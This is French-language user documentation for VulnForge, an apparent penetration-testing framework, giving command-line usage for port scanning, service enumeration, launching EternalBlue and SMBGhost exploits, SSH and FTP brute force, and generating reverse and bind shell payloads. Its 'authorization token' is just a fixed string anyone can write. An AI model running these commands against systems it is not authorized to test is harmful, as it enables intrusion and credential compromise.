# VulnForge — Documentation utilisateur

---

## 📋 Sommaire

1. [Présentation](#présentation)
2. [Installation](#installation)
3. [Configuration](#configuration)
4. [Commandes](#commandes)
5. [Exemples](#exemples)
6. [Rapports](#rapports)
7. [Compatibilité](#compatibilité)
8. [FAQ](#faq)

---

## 📖 Présentation

**VulnForge** est un framework d'exploitation modulaire pour les tests d'intrusion autorisés. Il permet de :

- Scanner des ports et services
- Vérifier les vulnérabilités connues (CVE)
- Lancer des exploits (SMB, SSH, FTP, Web)
- Générer des payloads (reverse/bind shells)
- Détecter des vecteurs d'élévation de privilèges
- Générer des rapports complets

---

## ⚙️ Installation

```bash
git clone https://github.com/theanonspider/VulnForge.git
cd VulnForge
pip install -r requirements.txt
```

---

## 🔐 Configuration

### Token d'autorisation

```bash
echo "VULNFORGE_AUTHORIZED" > vulnforge.token
```

### Fichier `config.json`

```json
{
  "token_required": true,
  "reports_dir": "./reports",
  "log_level": "info"
}
```

---

## ⌨️ Commandes

### `scan` – Scan de ports

```bash
python vulnforge.py scan -t 192.168.1.1 -p 1-1000
python vulnforge.py scan -t 192.168.1.1 -p 22,80,443 --timeout 2 --threads 200
```

**Options :**
- `-t, --target` : IP ou domaine (obligatoire)
- `-p, --ports` : ports (ex: `22,80,443` ou `1-1000`)
- `--timeout` : timeout de connexion (défaut: 1s)
- `--threads` : nombre de threads (défaut: 100)

---

### `enum` – Énumération de services

```bash
python vulnforge.py enum -t 192.168.1.1 -s all
python vulnforge.py enum -t 192.168.1.1 -s smb
python vulnforge.py enum -t 192.168.1.1 -s ssh --ports 22,2222
```

**Options :**
- `-t, --target` : IP ou domaine (obligatoire)
- `-s, --service` : `smb`, `ssh`, `ftp`, `http`, `all` (défaut: `all`)
- `--ports` : ports spécifiques (comma-separated)

---

### `vuln_check` – Vérification de vulnérabilités

```bash
python vulnforge.py vuln_check -t 192.168.1.1 -s '[{"service":"smb","port":445}]'
```

**Options :**
- `-t, --target` : IP ou domaine (obligatoire)
- `-s, --services` : JSON des services (obligatoire)

---

### `exploit` – Lancement d'exploits

```bash
python vulnforge.py exploit -t 192.168.1.1 -e eternalblue
python vulnforge.py exploit -t 192.168.1.1 -e ssh --username root --password toor
python vulnforge.py exploit -t 192.168.1.1 -e ftp --wordlist wordlist.txt
```

**Options :**
- `-t, --target` : IP cible (obligatoire)
- `-e, --exploit` : `eternalblue`, `smbghost`, `ssh`, `ftp`, `web`
- `--port` : port cible (défaut: 445 pour SMB)
- `--username` : nom d'utilisateur pour brute force
- `--password` : mot de passe pour brute force
- `--wordlist` : wordlist (format `user:pass`)

---

### `generate_payload` – Génération de payloads

```bash
python vulnforge.py generate_payload -p reverse --lhost 10.0.0.1 --lport 4444
python vulnforge.py generate_payload -p bind --lport 4444 --os windows --format powershell
```

**Options :**
- `-p, --payload` : `reverse` ou `bind` (défaut: `reverse`)
- `--lhost` : IP de l'écoute (obligatoire pour `reverse`)
- `--lport` : port d'écoute (défaut: 4444)
- `-f, --format` : `raw`, `base64`, `hex`, `powershell`, `bash`
- `--os` : `linux` ou `windows` (défaut: `linux`)

---

### `priv_esc` – Détection d'élévation de privilèges

```bash
python vulnforge.py priv_esc -t localhost
python vulnforge.py priv_esc -t 192.168.1.1 --remote --username admin --password pass
```

**Options :**
- `-t, --target` : IP ou hostname (défaut: `localhost`)
- `--remote` : vérifier à distance
- `--username` : nom d'utilisateur pour l'accès distant
- `--password` : mot de passe pour l'accès distant

---

### `report` – Génération de rapports

```bash
python vulnforge.py report -o ./reports -f html
python vulnforge.py report -o ./reports -f both -m '{"module":"scan","open_ports":[22,80]}'
```

**Options :**
- `-o, --output` : dossier de sortie (défaut: `./reports`)
- `-f, --format` : `html`, `json`, `both`
- `-m, --module-results` : JSON de résultats de modules à inclure

---

## 📄 Exemples complets

### Scan + Énumération + Vérification

```bash
# 1. Scanner les ports
python vulnforge.py scan -t 192.168.1.1 -p 1-1000 > scan.json

# 2. Énumérer les services sur les ports ouverts
python vulnforge.py enum -t 192.168.1.1 -s all > enum.json

# 3. Vérifier les vulnérabilités
python vulnforge.py vuln_check -t 192.168.1.1 -s "$(cat enum.json | jq '.services')" > vuln.json

# 4. Lancer un exploit SMB
python vulnforge.py exploit -t 192.168.1.1 -e eternalblue

# 5. Générer un rapport
python vulnforge.py report -o ./reports -f html
```

### Brute force SSH

```bash
# Utiliser une wordlist
python vulnforge.py exploit -t 192.168.1.1 -e ssh --wordlist credentials.txt

# Tester un seul couple
python vulnforge.py exploit -t 192.168.1.1 -e ssh --username admin --password admin123
```

---

## 📊 Rapports

Les rapports sont générés dans `./reports/` :
- `vulnforge_report_<timestamp>.json` – données brutes
- `vulnforge_report_<timestamp>.html` – visualisation

---

## 🖥️ Compatibilité

| OS | Modules fonctionnels |
|----|----------------------|
| **Windows** | ✅ Tous les modules |
| **Linux** | ✅ Tous les modules (sauf privilèges admin) |
| **macOS** | ⚠️ Partiel (non testé) |

---

## ❓ FAQ

### L'outil ne s'exécute pas
Vérifie que `vulnforge.token` existe avec `VULNFORGE_AUTHORIZED`.

### Un exploit ne fonctionne pas
Vérifie que la cible est vulnérable et que le service est ouvert.

### Les rapports ne sont pas générés
Vérifie que le dossier `./reports` est accessible en écriture.

---

## ⚖️ Licence

Usage exclusivement éducatif et défensif.

---

## 👤 Auteur

**@theanonspider** — Cybersécurité éthique. 🐺
